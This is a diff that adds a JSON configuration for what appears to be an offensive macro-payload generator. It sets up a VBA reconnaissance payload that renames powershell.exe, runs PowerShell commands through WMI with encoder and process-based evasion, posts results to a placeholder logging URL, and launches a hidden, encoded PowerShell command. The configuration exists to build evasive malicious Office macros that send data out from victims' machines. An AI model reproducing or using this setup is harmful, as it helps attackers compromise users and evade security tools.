@@ -1,0 +1,17 @@
+{
+	"description": "Recon payload with powershell renaming, and PS command execution via WMI, including evasion",
+	"template": "templates/payloads/recon-rename-wmi-cmd-evasion.vba",
+	"varcount": 150,
+	"encodingoffset": 4,
+	"chunksize": 200,
+	"encodedvars":{
+				"URL":"FULL URL THAT LOGS POST REQUESTS",
+                "PROCESS_NAME":"outlook.exe",
+                "SRC": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe",
+                "DST": "FILENAME.EXE",
+                "TEMP": "TEMP"
+			},
+	"vars": 	[],
+	"evasion": 	["encoder", "process"],
+	"payload": " -nop -w hidden -encodedcommand ..."
+}
